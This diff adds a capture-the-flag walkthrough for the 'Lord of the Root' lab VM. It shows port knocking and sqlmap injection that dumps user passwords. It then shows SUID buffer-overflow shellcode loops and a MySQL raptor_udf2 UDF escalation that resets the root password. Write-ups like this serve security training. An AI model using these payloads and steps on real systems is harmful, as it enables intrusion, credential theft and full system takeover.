@@ -1,0 +1,333 @@
+	                                   TARGET: LORD OF THE ROOT			
+	                                 
+	                                 
+--------------------------------------------------------------------------------------
+Target 10.0.2.21
+
+└─# nmap -sS -Pn 10.0.2.21
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 16:52 EST
+Nmap scan report for 10.0.2.21
+Host is up (0.00030s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 08:00:27:E8:11:47 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.08 seconds
+                                                             	                                 
+--------------------------------------------------------------------------------
+"Service Discovery via Port Knocking Bypass" Identified a 'cloaked' host at 10.0.2.21. After analyzing the challenge hints, implemented a manual TCP SYN 'knock' sequence (1,2,3) using Nmap. This triggered a dynamic firewall rule change on the target, exposing a hidden HTTP service on Port 1337 for further vulnerability assessment.
+
+                                                             	                               
+  for x in 1 2 3; do nmap -Pn --max-retries 0 -p $x 10.0.2.21; done
+  
+  ──(root㉿kali)-[/home/kali/Desktop]
+└─# nmap -p 1337 -sV 10.0.2.21
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 16:55 EST
+Nmap scan report for 10.0.2.21
+Host is up (0.00035s latency).
+
+PORT     STATE SERVICE VERSION
+1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+MAC Address: 08:00:27:E8:11:47 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
+
+--------------------------------------------------------------------------------------  
+Logged in website on 10.0.2.21:1337
+
+checked Robot.txt 
+found image and inspecting page found base 64
+THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
+
+
+echo "THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh" | base64 -d
+                                                          
+       Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!    
+       
+    echo "Lzk3ODM0NTIxMC9pbmRleC5waHA=" | base64 -d    
+──(root㉿kali)-[/home/kali/Desktop]
+└─# echo "Lzk3ODM0NTIxMC9pbmRleC5waHA=" | base64 -d
+/978345210/index.php                                                                                                           
+
+-----------------------------------------------------------------------------------------                            
+http://10.0.2.21:1337/978345210/index.php
+
+Discovered login page 
+
+Trying SqlMap
+sqlmap -u "http://10.0.2.21:1337/978345210/index.php" --data="username=test&password=test&submit=Login" --method POST --level 5 --risk 3 --batch --dbs
+
+output ....
+
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] Webapp
+
+[12:31:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.0.2.21'
+
+
+           sqlmap -u "http://10.0.2.21:1337/978345210/index.php" --data="username=test&password=test&submit=Login" -D Webapp -T Users --dump
+   
+   Database: Webapp
+Table: Users
+[5 entries]
++----+------------------+----------+
+| id | password         | username |
++----+------------------+----------+
+| 1  | iwilltakethering | frodo    |
+| 2  | MyPreciousR00t   | smeagol  |
+| 3  | AndMySword       | aragorn  |
+| 4  | AndMyBow         | legolas  |
+| 5  | AndMyAxe         | gimli    |
++----+------------------+----------+
+
+[14:29:57] [INFO] table 'Webapp.Users' dumped to CSV file '/root/.local/share/sqlmap/output/10.0.2.21/dump/Webapp/Users.csv'
+[14:29:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.0.2.21'
+------------------------------------------------------------------------------------------------
+
+ssh smeagol@10.0.2.21     pass MyPreciousR00t
+
+smeagol@LordOfTheRoot:~$ id
+uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
+smeagol@LordOfTheRoot:~$ uname -a
+Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 athlon i686 GNU/Linux
+smeagol@LordOfTheRoot:~$ cat /etc/issue
+Ubuntu 14.04.3 LTS \n \l
+
+find / -perm -4000 -type f 2>/dev/null
+
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/umount
+/bin/ping6
+/SECRET/door2/file
+/SECRET/door1/file
+/SECRET/door3/file
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/lppasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/mtr
+/usr/bin/sudo
+/usr/bin/X
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
+/usr/sbin/uuidd
+/usr/sbin/pppd
+smeagol@LordOfTheRoot:~$ 
+
+/SECRET/door1/file $(python -c 'print "A"*300')
+/SECRET/door2/file $(python -c 'print "A"*300')
+/SECRET/door3/file $(python -c 'print "A"*300')
+
+Segmentation fault (core dumped)
+
+found kernel 3.19.0-25-generic exploit avail overlayfs
+---------------------------------------------------------------
+
+cp /usr/share/exploitdb/exploits/linux/local/37292.c ofs.c
+
+
+created http server with python on port 80
+downloaded file from Smeagle machine
+compiling ofs with gcc ofs.c -o ofs
+got error trying to troubleshoot..
+
+cp /usr/share/exploitdb/exploits/linux/local/37293.c ofs2.c
+
+------------------------------------------------------------
+Finding offset for ..
+/SECRET/door1/file $(python -c 'print "A"*170')
+
+cat /proc/sys/kernel/randomize_va_space
+Asld fully activated came back as : 2
+
+while true; do /SECRET/door1/file $(python -c 'print "\x90"*140 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x00\xd5\xff\xbf"*10'); done
+
+
+smeagol@LordOfTheRoot:/tmp$ gdb -q /SECRET/door1/file
+Reading symbols from /SECRET/door1/file...(no debugging symbols found)...done.
+(gdb) run $(python -c 'print "A"*180')
+Starting program: /SECRET/door1/file $(python -c 'print "A"*180')
+[Inferior 1 (process 31068) exited normally]
+(gdb) gdb -q /SECRET/door1/file
+Undefined command: "gdb".  Try "help".
+(gdb) 
+TheRoot:/$ gdb) quit
+-bash: syntax error near unexpected token `)'
+smeagol@LordOfTheRoot:/$ smeagol@LordOfTheRoot:/tmp$ /SECRET/door1/file
+-bash: smeagol@LordOfTheRoot:/tmp$: No such file or directory
+smeagol@LordOfTheRoot:/$ Syntax: /SECRET/door1/file <input string>
+-bash: syntax error near unexpected token `newline'
+smeagol@LordOfTheRoot:/$ smeagol@LordOfTheRoot:/tmp$ 
+-bash: smeagol@LordOfTheRoot:/tmp$: No such file or directory
+smeagol@LordOfTheRoot:/$ gdb) quit
+-bash: syntax error near unexpected token `)'
+smeagol@LordOfTheRoot:/$ smeagol@LordOfTheRoot:/tmp$ /SECRET/door1/file
+-bash: smeagol@LordOfTheRoot:/tmp$: No such file or directory
+smeagol@LordOfTheRoot:/$ Syntax: /SECRET/door1/file <input string>
+-bash: syntax error near unexpected token `newline'
+smeagol@LordOfTheRoot:/$ smeagol@LordOfTheRoot:/tmp$ 
+-bash: smeagol@LordOfTheRoot:/tmp$: No such file or directory
+smeagol@LordOfTheRoot:/$ /SECRET/door1/file $(python -c 'print "A"*200')
+smeagol@LordOfTheRoot:/$ /SECRET/door2/file $(python -c 'print "A"*200')
+Segmentation fault (core dumped)
+smeagol@LordOfTheRoot:/$ /SECRET/door3/file $(python -c 'print "A"*200')
+smeagol@LordOfTheRoot:/$ /SECRET/door2/file $(python -c 'print "A"*150')
+smeagol@LordOfTheRoot:/$ /SECRET/door2/file $(python -c 'print "A"*175')
+Segmentation fault (core dumped)
+smeagol@LordOfTheRoot:/$ /SECRET/door2/file $(python -c 'print "A"*250')
+Segmentation fault (core dumped)
+smeagol@LordOfTheRoot:/$ 
+
+
+while true; do /SECRET/door2/file $(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*48 + "\x10\xd0\xff\xbf"'); done
+
+while true; do /SECRET/door2/file $(python -c 'print "\x90"*120 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*28 + "\x10\xf3\xff\xbf"'); done
+
+while true; do /SECRET/door2/file $(python -c 'print "\x90"*148 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x10\xf3\xff\xbf"'); done
+
+
+smeagol@LordOfTheRoot:/$ find / -perm -4000 -type f 2>/dev/null
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/umount
+/bin/ping6
+/SECRET/door2/file
+/SECRET/door1/file
+/SECRET/door3/file
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/lppasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/mtr
+/usr/bin/sudo
+/usr/bin/X
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
+/usr/sbin/uuidd
+/usr/sbin/pppd
+smeagol@LordOfTheRoot:/$ 
+
+
+smeagol@LordOfTheRoot:/$ ps aux | grep mysql
+root      1173  0.0  4.4 327004 45636 ?        Ssl  Feb11   0:51 /usr/sbin/mysqld
+smeagol  17446  0.0  0.1   4692  2028 pts/3    S+   05:03   0:00 grep --color=auto mysql
+smeagol@LordOfTheRoot:/$ 
+meagol@LordOfTheRoot:~$ ls -l /SECRET/door*/file
+-rwsr-xr-x 1 root root 7370 Sep 17  2015 /SECRET/door1/file
+-rwsr-xr-x 1 root root 5150 Sep 22  2015 /SECRET/door2/file
+-rwsr-xr-x 1 root root 7370 Sep 17  2015 /SECRET/door3/file
+smeagol@LordOfTheRoot:~$ 
+
+Door 2 is vuln ..
+
+while true; do /SECRET/door2/file $(python -c 'print "A"*171 + "\x80\x2e\xb8\xbf" + "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"'); done
+
+while true; do /SECRET/door3/file $(python -c 'print "\x90"*80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" + "A"*67 + "\xd0\xf2\xff\xbf"'); done
+
+------------------------------------------------------------------
+pivoted to sql used " darkshadow " previously recovered in the sqlmap...
+
+mysql -u root -p
+darkshadow
+
+wget https://www.exploit-db.com/download/1518 -O raptor_udf2.c
+
+
+USE mysql;
+CREATE TABLE foo(line blob);
+INSERT INTO foo VALUES(load_file('/home/smeagol/raptor_udf2.so'));
+SELECT * FROM foo INTO dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
+
+smeagol@LordOfTheRoot:~$ ls -lh /home/smeagol/raptor_udf2.so
+ls: cannot access /home/smeagol/raptor_udf2.so: No such file or directory
+smeagol@LordOfTheRoot:~$ wget https://www.exploit-db.com/download/1518 -O raptor_udf2.c
+--2026-02-13 06:20:51--  https://www.exploit-db.com/download/1518
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3378 (3.3K) [application/txt]
+Saving to: ‘raptor_udf2.c’
+
+100%[===================================================================>] 3,378       --.-K/s   in 0s      
+
+2026-02-13 06:20:51 (674 MB/s) - ‘raptor_udf2.c’ saved [3378/3378]
+
+smeagol@LordOfTheRoot:~$ gcc -g -c raptor_udf2.c
+smeagol@LordOfTheRoot:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+smeagol@LordOfTheRoot:~$ 
+
+mysql> USE mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> CREATE TABLE exploit(line blob);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> INSERT INTO exploit VALUES(load_file('/home/smeagol/raptor_udf2.so'));
+Query OK, 1 row affected (0.01 sec)
+
+mysql> -- We use 'final_root.so' to avoid the old broken file
+mysql> SELECT * FROM exploit INTO dumpfile '/usr/lib/mysql/plugin/final_root.so';
+Query OK, 1 row affected (0.00 sec)
+
+mysql> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'final_root.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> SELECT do_system('echo "root:root123" | chpasswd');
++---------------------------------------------+
+| do_system('echo "root:root123" | chpasswd') |
++---------------------------------------------+
+|                                           0 |
++---------------------------------------------+
+1 row in set (0.02 sec)
+
+mysql> exit
+Bye
+smeagol@LordOfTheRoot:~$ 
+
+meagol@LordOfTheRoot:~$ su root
+Password: 
+root@LordOfTheRoot:/home/smeagol# cd /root
+root@LordOfTheRoot:~# ls
+buf  buf.c  Flag.txt  other  other.c  switcher.py
+root@LordOfTheRoot:~# cat flag.txt
+cat: flag.txt: No such file or directory
+root@LordOfTheRoot:~# cat Flag.txt
+“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+– Gandalf
+root@LordOfTheRoot:~# 
+
+
+
+
+
+
+
